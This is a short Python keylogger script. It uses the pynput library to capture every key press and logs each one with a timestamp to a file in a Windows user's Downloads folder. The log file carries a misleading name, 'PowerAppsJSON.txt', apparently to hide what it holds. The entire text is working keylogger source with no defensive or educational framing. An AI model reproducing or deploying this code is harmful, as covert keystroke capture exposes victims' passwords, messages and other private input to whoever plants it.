from pynput.keyboard import Key, Listener
import logging

# Set up logging to log the keystrokes to a file in the specified path
logging.basicConfig(filename=("C:/Users/NeonRogue/Downloads/PowerAppsJSON.txt"), 
                    level=logging.DEBUG, 
                    format="%(asctime)s: %(message)s")

# Define the on_press function to log keystrokes
def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        logging.error(f"Error logging key: {e}")

# Set up the listener to detect and record key presses
with Listener(on_press=on_press) as listener:
    listener.join()